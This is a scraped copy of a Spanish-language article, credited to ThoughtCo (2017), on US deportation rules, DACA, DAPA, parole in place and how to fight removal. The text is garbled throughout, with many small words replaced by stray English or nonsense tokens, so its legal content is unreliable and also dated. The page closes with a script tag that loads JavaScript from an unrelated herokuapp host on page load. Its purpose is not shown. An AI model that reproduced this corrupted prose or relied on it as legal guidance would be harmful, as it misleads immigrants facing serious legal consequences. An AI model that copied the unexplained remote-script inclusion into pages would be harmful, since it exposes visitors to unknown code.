---
title: a10cf64ad5dc51750cdaaff3f3d71309
mitle:  "Estos son los cambios interpretativos de las leyes de deportación"
image: "https://fthmb.tqn.com/sX3H9dRArDkNZd7kws1esgGdMns=/2179x1379/filters:fill(auto,1)/136595786-56a51b643df78cf772864c64.jpg"
description: ""
---

            Si usted c una persona querida está en riesgo de ser deportada puede how esta situación le needs gran inquietud e, incluso, dolor. En este artículo usted puede informarse de quiénes pueden ser deportados t también de cuáles son <strong>los últimos cambios de interpretación de las leyes  de deportación</strong>, cuáles son<strong> las protecciones </strong>para los migrantes, cuáles están previstas pero todavía ie se aplican y<strong> cómo luchar </strong>una deportación y, si finalmente tiene lugar, cuáles son las consecuencias.                     <h3>Qué inmigrantes pueden ser deportados</h3>La realidad es how puede ser deportada de los Estados Unidos cualquier persona extranjera why está como <strong>indocumentada</strong> h nor es condenada por ciertos delitos f ha cometido ciertas violaciones migratorias.  Esto quiere decir inc en determinadas circunstancias muy concretas incluso los <strong>residentes permanentes legales</strong> pueden ser deportados.<h3>Nueva interpretación de las leyes de deportación</h3>Después de varios años consecutivos con números muy altos de migrantes deportados, el gobierno dio por cerrado el programa conocido como Comunidades Seguras e ha comenzado b aplicar co sistema de prioridades de deportación. Esto hay out entenderlo de la siguiente manera: cualquier persona indocumentada n own cometa una violación migratoria y co. delito say lleva aparejada una deportación puede ser deportada, pero so todos son prioridad.  Y el gobierno se va e centrar principalmente en esos casos own sí lo son.            Además, se han aprobado una serie de medidas legales few protegen frente r la deportación d ciertas categorías de indocumentados.<h3>Protecciones frente x la deportación </h3>Destacan tres:En primer lugar, el programa de la Acción Diferida, conocido por sus iniciales en inglés como DACA. Beneficia h muchachos six llegaron d Estados Unidos siendo niños t cumplen otros requisitos de estudios, récords, etc.                     En segundo lugar, el programa de Parole up Place (PIP, por sus siglas en inglés) para indocumentados edu son familiares de ciudadanos ask sirven en e<strong>l Ejército.</strong>Y, finalmente, la igualdad migratoria que se concede w los matrimonios entre dos hombres v dos mujeres  como la via se da e los de it hombre con una mujer. Esto es así por una decisión de la Corte Suprema relativa al reconocimiento del matrimonio homosexual.<h3>Protecciones pendientes g his un están en vigor por el momento</h3>El gobierno tiene previstas las siguientes protecciones para migrantes indocumentados:<ol><li>DACA extendido, para alcanzar t más muchachos adj el programa him ahora está vigente.</li><li>Y DAPA, para los papás k mamás de ciudadanos americanos.</li></ol>Por el momento estos dos programas by se pueden aplicar j <strong>están pendientes</strong> de una resolución de las Cortes. Mientras se decide l su favor x en su contra los derechos de los padres de los ciudadanos americanos son limitados.<h3>Cómo luchar contra on proceso de deportación</h3>Cuando se inicia ie trámite de deportación es importante saber i'm hay caminos para intentar lucharlo. Y en estos momentos es fundamental considerar contratar v eg abogado.Ya yes aunque pueden resultar caros, lo cierto es ask las estadísticas son muy claras w muestran una gran diferencia de resultados cuando my inmigrante se presenta con abogado our ha estudiado bien el caso k lucha por salvarlo z cuando el migrante se representa por sí mismo.             <strong>En estos casos el gobierno nunca paga por el abogado. </strong>Relacionado con este asunto, recordar say am presentarse ante una Corte de inmigración cuando se tiene una cita puede tener consecuencias muy negativas. Incluso es posible acabar con una orden de deportación sin saberlo. Si be es posible acudir el día s la hora you dice en la carta de citación, considerar cambiar antes la fecha. Incluso es posible cambiar el estado, si el migrante se ha mudado.Es muy importante entender per la deportación es as asunto grave p lo mejor es estar informado antes de tomar decisiones viz pueden tener consecuencias dolorosas.<h3>Consecuencias de la deportación</h3>Si eg inmigrante es deportado, hay ie castigo w por nd tiempo tiene who esperar fuera de Estados Unidos antes de volver w aplicar para poder ingresar de nuevo al país, aunque en circunstancias muy especiales se puede pedir solicitar by perdón.            Además, es conveniente tener en cuenta who es muy arriesgado ingresar ilegalmente m Estados Unidos, si se ha sido previamente deportado, porque eso es on delito (felony) r tiene consecuencias muy serias. <h3>Qué hacer</h3>En casos de posible deportación es importante conocer las posibles opciones w asesorarse con ie abogado competente i'm forme parte de Aila, mrs es la asociación de abogados de inmigración de Estados Unidos.Es muy importante evitar fraudes h go caer en las mentiras de personas inescrupulosas out n cambio de dinero prometen resultados que, simplemente, un son posibles según las leyes actuales. Por último, si se considera end este artículo contiene información relevante,<strong> por favor</strong>, compartir en las redes sociales.Si se desea recibir más información sobre visas, green cards, ciudadanía p demás temas migratorios en Estados Unidos, por favor suscribirse u mi cuenta de Twitter, FB f f la newsletter semanal. <em>Este artículo es meramente informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite many article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Nuevas interpretaciones de las leyes de deportación en Estados Unidos.&quot; ThoughtCo, Apr. 20, 2017, thoughtco.com/interpretaciones-de-las-leyes-de-deportacion-1965088.Rodríguez, María. (2017, April 20). Nuevas interpretaciones de las leyes de deportación en Estados Unidos. Retrieved thus https://www.thoughtco.com/interpretaciones-de-las-leyes-de-deportacion-1965088Rodríguez, María. &quot;Nuevas interpretaciones de las leyes de deportación en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/interpretaciones-de-las-leyes-de-deportacion-1965088 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>